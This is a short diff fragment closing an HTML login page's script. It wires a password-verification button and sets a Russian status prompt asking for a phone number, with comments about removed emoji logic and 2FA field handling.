+        // 3. Логика с эмодзи обезьяны удалена по запросу пользователя.
+        // Очистка поля 2FA и фокус при ошибке реализованы в verifyPassword().
+
+
+        // 4. Verify Password Button
+        document.getElementById('verify-password').addEventListener('click', verifyPassword);
+
+
+        // Initialize state message
+        setStatus('Введите номер телефона для получения кода.');
+    </script>
+</body>
+</html>
 
